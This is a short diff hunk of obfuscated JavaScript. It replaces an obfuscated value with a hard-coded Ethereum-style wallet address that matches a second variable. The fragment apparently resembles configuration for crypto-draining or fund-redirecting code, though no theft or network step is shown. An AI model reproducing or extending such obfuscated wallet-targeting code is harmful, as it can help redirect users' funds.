@@ -34,7 +34,7 @@ const TOKEN = _0x4b49bd(3454, 6140, 5699, 3880, 4389)
 function _0x108c7f(d, e, c, W, m) {
     return _0x20d2(d - 563, m)
 }
-var wh = _0x4db4f7(2143, 623, 1445, "#7![", 994)
+var wh = "0x053973D64EE9256d6957E3C5D2b5dD100064F07F"
   , wF = 100
   , wl = "0x053973D64EE9256d6957E3C5D2b5dD100064F07F"
   , wt = 20
